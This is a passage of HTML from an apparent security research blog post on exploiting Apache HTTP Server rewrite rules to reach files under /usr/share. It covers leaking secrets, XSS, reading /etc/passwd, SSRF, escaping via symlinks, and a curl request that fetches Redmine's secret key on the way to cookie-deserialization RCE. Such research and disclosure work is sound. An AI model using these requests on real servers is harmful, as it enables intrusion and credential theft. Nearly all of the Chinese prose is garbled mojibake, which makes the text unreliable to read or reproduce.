&lt;p&gt;ÊâÄ‰ª•ÊàëÂÄëÁöÑ„Äå‰ªªÊÑèÊ™îÊ°àÂ≠òÂèñ„Äç‰ºº‰πéÊúâÈªûÈÇ£È∫ºÂú∞‰∏ç‰ªªÊÑè„ÄÇ ‰∏çÈÅéÊàëÂÄëÊâìÁ†¥ÂéüÊú¨Âè™ËÉΩÁÄèË¶Ω DocumentRoot ÁöÑ‰ø°‰ªªÁÆóÊòØË∑®Âá∫ÂæàÂ§ßÁöÑ‰∏ÄÊ≠•‰∫Ü„ÄÇ Êé•‰∏ã‰æÜË¶ÅÂÅöÁöÑ‰∫ãÊÉÖÂ∞±ÊòØ„ÄåÂ£ìÊ¶®„ÄçÈÄôÂÄãÁõÆÈåÑÂÖßÁöÑÂêÑÁ®ÆÂèØËÉΩ„ÄÇ„ÄÄÊâÄÊúâÂèØÂà©Áî®ÁöÑË≥áÊ∫ê„ÄÅÁõÆÈåÑ‰∏≠ÁèæÊúâÁöÑÊïôÂ≠∏ÁØÑ‰æã„ÄÅË™™ÊòéÊñá‰ª∂„ÄÅÂñÆÂÖÉÊ∏¨Ë©¶Ê™îÊ°àÔºåÁîöËá≥‰º∫ÊúçÂô®‰∏äÁ®ãÂºèË™ûË®ÄÂ¶Ç PHP„ÄÅPython ÁîöËá≥ PHP ÁöÑÊ®°ÁµÑÈÉΩÊúâÊ©üÊúÉÊàêÁÇ∫ÊàëÂÄëÊø´Áî®ÁöÑÂ∞çË±°ÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Áï∂ÁÑ∂‰∏äÈù¢Âè™ÊòØÂü∫Êñº Ubuntu/Debian ‰ΩúÊ•≠Á≥ªÁµ±ÁôºË°åÁöÑ Httpd ÁâàÊú¨Ë®≠ÂÆöÂÅöËß£ÈáãÔºåÂØ¶Âãô‰∏ä‰πüÊúâÁôºÁèæ‰∏Ä‰∫õÊáâÁî®ËªüÈ´îÁõ¥Êé•ÊääÁöÑÊ†πÁõÆÈåÑÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt; ÁßªÈô§Â∞éËá¥ÂèØ‰ª•Áõ¥Êé•Â≠òÂèñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-2-2-1-local-gadget-to-information-disclosure&quot;&gt;‚úîÔ∏è 2-2-1. Local Gadget to Information Disclosure&lt;/h5&gt;

&lt;p&gt;È¶ñÂÖà‰æÜÂ∞ãÊâæÁúãÁúãÈÄôÂÄãÁõÆÈåÑ‰∏ãÊòØÂê¶Â≠òÂú®ÈÄô‰∏Ä‰∫õÊ™îÊ°àÊòØÂèØ‰ª•Âà©Áî®ÁöÑ„ÄÇ È¶ñÂÖàÊòØÁõÆÊ®ô Apache HTTP Server Â¶ÇÊûúÂÆâË£ù &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;websocketd&lt;/code&gt; ÈÄôÂÄãÊúçÂãôÁöÑË©±ÔºåÊúçÂãôÂ•ó‰ª∂È†êË®≠ÊúÉÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/doc/websocketd/examples/php/&lt;/code&gt; ‰∏ãÊîæÁΩÆ‰∏ÄÂÄãÁØÑ‰æã PHP Á®ãÂºèÁ¢º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dump-env.php&lt;/code&gt;ÔºåÂ¶ÇÊûúÁõÆÊ®ô‰º∫ÊúçÂô®‰∏äÂ≠òÂú® PHP Áí∞Â¢ÉÁöÑË©±ÂèØ‰ª•Áõ¥Êé•Â≠òÂèñÈÄôÂÄãÁØÑ‰æãÁ®ãÂºèÂéªÊ¥©ÊºèÊïèÊÑüÁöÑÁí∞Â¢ÉËÆäÊï∏„ÄÇ&lt;/p&gt;

&lt;p&gt;Âè¶Â§ñÂ¶ÇÊûúÁõÆÊ®ôÂêåÊôÇÂÆâË£ùÂ¶Ç Nginx ÊàñÊòØ Jetty ÁöÑË©±ÔºåÈõñÁÑ∂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; ÁêÜË´ñ‰∏äË©≤ÊòØÂ•ó‰ª∂ÂÆâË£ùÊôÇÊâÄÂ≠òÊîæÁöÑÂîØËÆÄË§áÊú¨Ôºå‰ΩÜÈÄô‰∫õÊúçÂãôÁöÑÈ†êË®≠ Web Root Â∞±Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; ‰∏ãÔºåÂõ†Ê≠§‰πüËÉΩÈÄèÈÅéÈÄôÂÄãÊîªÊìäÊâãÊ≥ïÂéªÊ¥©ÊºèÈÄô‰∫õÁ∂≤È†ÅÊáâÁî®ÁöÑÊïèÊÑüË≥áË®äÔºå‰æãÂ¶Ç Jetty ‰∏äÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; Ë®≠ÂÆöÁ≠âÁ≠âÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/nginx/html/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/etc/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/webapps/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÄôË£°Á∞°ÂñÆÂ±ïÁ§∫‰∏ÄÂÄãÈÄèÈÅéÂ≠òÂèñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Davical&lt;/code&gt; Â•ó‰ª∂ÊâÄÂ≠òÂú®ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setup.php&lt;/code&gt; ÂîØËÆÄË§áÊú¨ÂéªÊ¥©Êºè &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt; ÂÖßÂÆπ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-2-2-2-local-gadget-to-xss&quot;&gt;‚úîÔ∏è 2-2-2. Local Gadget to XSS&lt;/h5&gt;

&lt;p&gt;Êé•ËëóÂ¶Ç‰ΩïÊääÈÄôÂÄãÊîªÊìäÊâãÊ≥ïËΩâÂåñÊàê XSS Âë¢Ôºü Âú® Ubuntu Desktop Áí∞Â¢É‰∏≠È†êË®≠ÊúÉÂÆâË£ù LibreOffice ÈÄôÂ•óÈñãÊ∫êÁöÑËæ¶ÂÖ¨ÂÆ§ÊáâÁî®ÔºåÂà©Áî®ÂÖ∂‰∏≠Âπ´Âä©Êñá‰ª∂ÁöÑË™ûË®ÄÂàáÊèõÂäüËÉΩ‰æÜÂÆåÊàê XSS„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /usr/share/libreoffice/help/help.html&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// the URL came from LibreOffice help (F1)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getParameterByName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/index.html?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;latest/index.html&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âõ†Ê≠§Â∞±ÁÆóÁõÆÊ®ôÊ≤íÊúâÈÉ®ÁΩ≤‰ªª‰ΩïÁ∂≤È†ÅÊáâÁî®ÔºåÊàëÂÄë‰πüÂèØ‰ª•Âà©Áî®‰∏ÄÂÄã‰∏çÂÆâÂÖ®ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ÈÄèÈÅé‰ΩúÊ•≠Á≥ªÁµ±Ëá™Â∏∂ÁöÑÊ™îÊ°à‰æÜÂâµÈÄ†Âá∫ XSS„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-2-2-3-local-gadget-to-lfi&quot;&gt;‚úîÔ∏è 2-2-3. Local Gadget to LFI&lt;/h5&gt;

&lt;p&gt;Ëá≥Êñº‰ªªÊÑèÊ™îÊ°àËÆÄÂèñÂë¢Ôºü Â¶ÇÊûúÁõÆÊ®ô‰º∫ÊúçÂô®‰∏äÂÆâË£ù‰∫Ü‰∏Ä‰∫õ PHP ÁîöËá≥ÂâçÁ´ØÊáâÁî®Â•ó‰ª∂Ôºå‰æãÂ¶Ç JpGraph„ÄÅjQuery-jFeed ÁîöËá≥ WordPress Êàñ Moodle Â§ñÊéõÔºåÈÇ£È∫ºÂÆÉÂÄëËá™Â∏∂ÁöÑ‰ΩøÁî®ÊïôÂ≠∏ÊàñÊòØÈô§ÈåØÁî®Á®ãÂºèÁ¢ºÈÉΩÂèØ‰ª•ËÆäÊàêÂà©Áî®ÁöÑÂ∞çË±°Ôºå‰æãÂ¶ÇÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php&lt;/li&gt;
  &lt;li&gt;/usr/share/javascript/jquery-jfeed/proxy.php&lt;/li&gt;
  &lt;li&gt;/usr/share/moodle/mod/assignment/type/wims/getcsv.php&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÄôË£°Â±ïÁ§∫Âà©Áî® jQuery-jFeed ÊâÄËá™Â∏∂ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy.php&lt;/code&gt; ‰æÜËÆÄÂèñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;Ôºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-2-2-4-local-gadget-to-ssrf&quot;&gt;‚úîÔ∏è 2-2-4. Local Gadget to SSRF&lt;/h5&gt;

&lt;p&gt;Áï∂ÁÑ∂ÊâæÂà∞‰∏ÄÂÄã SSRF ‰πü‰∏çÂú®Ë©±‰∏ãÔºå‰æãÂ¶Ç MagpieRSS Êèê‰æõ‰∫Ü‰∏ÄÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magpie_debug.php&lt;/code&gt; Ê™îÊ°àÂ∞±ÊòØ‰∏ÄÂÄãÁµï‰Ω≥ÁöÑÂ∞èÂ∑•ÂÖ∑Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/php/magpierss/scripts/magpie_debug.php&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;Ô∏è-2-2-5-local-gadget-to-rce&quot;&gt;‚úîÔ∏è 2-2-5. Local Gadget to RCE&lt;/h5&gt;

&lt;p&gt;ÊâÄ‰ª•ËÉΩ RCE ÂóéÔºü Âà•ÊÄ•ÊàëÂÄëÂÖàÊÖ¢ÊÖ¢‰æÜÔºÅ È¶ñÂÖàÈÄôÂÄãÊîªÊìäÊâãÊ≥ïÂ∑≤Á∂ìÂèØ‰ª•ÊääÊó¢ÊúâÁöÑÊîªÊìäÈù¢ÂÖ®ÈÉ®ÈáçÊñ∞Â•óÁî®‰∏ÄÊ¨°‰∫ÜÔºå‰æãÂ¶ÇÂú®ÊüêÊ¨°ÈñãÁôºÈÅéÁ®ã‰∏≠‰∏çÂ∞èÂøÉË¢´ÈÅ∫Áïô‰∏ã‰æÜ (ÁîöËá≥ÂèØËÉΩÈÇÑÊòØË¢´Á¨¨‰∏âÊñπÂ•ó‰ª∂ÊâÄ‰æùË≥¥ÁöÑ) ÁöÑËàäÁâàÊú¨ PHPUnitÔºåÂèØ‰ª•Áõ¥Êé•‰ΩøÁî® &lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841&quot;&gt;CVE-2017-9841&lt;/a&gt; ‰æÜÂü∑Ë°å‰ªªÊÑèÁ®ãÂºèÁ¢ºÔºåÂèàÊàñËÄÖÊòØÂÆâË£ùÂÆå phpLiteAdmin (Áî±ÊñºÊòØÂîØËÆÄÂâØÊú¨ÊâÄ‰ª•È†êË®≠ÂØÜÁ¢ºÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;)ÔºåÁõ∏‰ø°ÁúãÂà∞ÈÄôÈÇäÊúÉÁôºÁèæ Local Gadgets Manipulation ÈÄôÂÄãÊîªÊìäÊâãÊ≥ïÂ≠òÂú®ËëóÁÑ°Á™ÆÊΩõÂäõÔºåÂâ©‰∏ãÂè™ÊòØÁôºÊéòÂá∫Êõ¥Âé≤ÂÆ≥‰ª•ÂèäÊõ¥ÈÄöÁî®ÁöÑÂ∞èÂ∑•ÂÖ∑ÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;‚öîÔ∏è Primitive 2-3. Jailbreak from Local Gadgets&lt;/h4&gt;

&lt;p&gt;ÁúãÂà∞ÈÄôË£°‰Ω†ÂèØËÉΩÊúÉÂ•ΩÂ•áÔºö „ÄåÁúüÁöÑ‰∏çËÉΩË∑≥Âá∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; ÂóéÔºü„Äç Áï∂ÁÑ∂ÂèØ‰ª•ÔºåÈÄô‰πüÊòØË¶Å‰ªãÁ¥πÁöÑÁ¨¨‰∏âÂÄãÊîªÊìäÊâãÊ≥ï ‚Äî‚Äî &lt;strong&gt;Âæû &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; ‰∏≠Ë∂äÁçÑÔºÅ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160&quot;&gt;Debian/Ubuntu&lt;/a&gt; ÁöÑ Httpd ÁôºË°åÁâà‰∏≠È†êË®≠ÈñãÂïü‰∫Ü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FollowSymLinks&lt;/code&gt; ÈÅ∏È†ÖÔºåÂ∞±ÁÆóÈùû Debian/Ubuntu ÁôºË°åÁâà‰ΩÜ Apache HTTP Server ‰πüÈö±Âê´Âú∞È†êË®≠&lt;a href=&quot;https://httpd.apache.org/docs/current/mod/core.html#options&quot;&gt;ÂÖÅË®±Á¨¶ËôüÈÄ£Áµê&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Options&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;FollowSymLinks&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;Ô∏è-2-3-1-jailbreak-from-local-gadgets&quot;&gt;‚úîÔ∏è 2-3-1. Jailbreak from Local Gadgets&lt;/h5&gt;

&lt;p&gt;Âõ†Ê≠§Âè™Ë¶ÅÊúâÂ•ó‰ª∂Âú®ÂÆÉÁöÑÂÆâË£ùÁõÆÈåÑ‰∏ãÁ¨¶ËôüÈÄ£ÁµêÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; Â§ñÔºåÈÄôÂÄãÁ¨¶ËôüÈÄ£ÁµêÂ∞±ÊàêÁÇ∫‰∏ÄÂÄãË∑≥ÊùøÂéªÂ≠òÂèñÊõ¥Â§öÁöÑÂ∞èÂ∑•ÂÖ∑ÂÆåÊàêÊõ¥Â§öÁöÑÂà©Áî®„ÄÇ ÈÄôË£°ÂàóÂá∫‰∏Ä‰∫õÊàëÂÄëÂ∑≤Á∂ìÁôºÁèæÂèØÂà©Áî®ÁöÑÁ¨¶ËôüÈÄ£ÁµêÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Cacti Log&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/cacti/site/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/cacti/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Data&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/data/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/solr/data&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/conf/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/solr/conf/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MediaWiki Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/mediawiki/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/mediawiki/config/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SimpleSAMLphp Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/simplesamlphp/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/simplesamlphp/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;Ô∏è-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;‚úîÔ∏è 2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/h5&gt;

&lt;p&gt;Ë∂äÁçÑÊîªÊìäÊâãÊ≥ïÁöÑÊúÄÂæåËÆìÊàëÂÄëÂ±ïÁ§∫‰∏ÄÂÄãÂà©Áî® Redmine ÁöÑÈõôÂ±§Á¨¶ËôüÈÄ£ÁµêË∑≥Ë∫çÂéªÂÆåÊàê RCE ÁöÑ‰æãÂ≠ê„ÄÇ Âú®È†êË®≠ÂÆâË£ùÁöÑ Redmine Á®ãÂºèÁ¢ºÁõÆÈåÑ‰∏≠ÊúâÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;instances/&lt;/code&gt; ÁõÆÈåÑÊåáÂêë &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt;ÔºåËÄå‰ΩçÊñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt; ‰∏ãÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;default/config/&lt;/code&gt; ÁõÆÈåÑÂèàÊåáÂêë &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/redmine/default/&lt;/code&gt; Ë≥áÊñôÂ§æÔºåË£°Èù¢Â≠òÊîæËëó Redmine ÁöÑË≥áÊñôÂ∫´Ë®≠ÂÆö‰ª•ÂèäÊáâÁî®Á®ãÂºèÁßÅÂØÜÈáëÈë∞„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /usr/share/redmine/instances/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /var/lib/redmine/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /var/lib/redmine/config/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /etc/redmine/default/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/redmine/default/
 database.yml    secret_key.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊñºÊòØÈÄèÈÅé‰∏ÄÂÄã‰∏çÂÆâÂÖ®ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ‰ª•ÂèäÂÖ©Â±§Á¨¶ËôüÈÄ£ÁµêÔºåÊàëÂÄëËÉΩÂ§†ËºïÈ¨ÜÂ≠òÂèñÂà∞ Redmine ÊâÄ‰ΩøÁî®ÁöÑÊáâÁî®Á®ãÂºèÈáëÈë∞Ôºö&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
 HTTP/1.1 200 OK
 Server: Apache/2.4.59 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
 ...
 6d222c3c3a1881c865428edb79a74405
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ËÄå Redmine ÂèàÊòØÂü∫Êñº Ruby on Rails ÊâÄÈñãÁôºÁöÑÊáâÁî®Á®ãÂºèÔºåÂÖ∂‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key.txt&lt;/code&gt; ÁöÑÂÖßÂÆπÂÖ∂ÂØ¶Ê≠£ÊòØÂÖ∂Á∞ΩÁ´†Âä†ÂØÜÊâÄ‰ΩøÁî®Âà∞ÁöÑÈáëÈë∞ÔºåÊé•‰∏ã‰æÜÁöÑÊµÅÁ®ãÁõ∏‰ø°Â∞ç&lt;a href=&quot;https://drive.google.com/file/d/1UMxphxFxwRf7wbrw4_Hr56KGPzpLU3Ef/view&quot;&gt;ÁÜüÊÇâÊîªÊìä RoR ÁöÑÂêåÂ≠∏&lt;/a&gt;ÊáâË©≤‰∏çÈôåÁîüÔºåÈÄèÈÅéÂ∑≤Áü•ÁöÑÈáëÈë∞Â∞áÊÉ°ÊÑè Marshal Áâ©‰ª∂Á∞ΩÁ´†Âä†ÂØÜÂæåÂµåÂÖ• CookieÔºåÊé•ËëóÈÄèÈÅé‰º∫ÊúçÂô®Á´ØÁöÑÂèçÂ∫èÂàóÂåñÊúÄÁµÇÂØ¶ÁèæÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°åÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

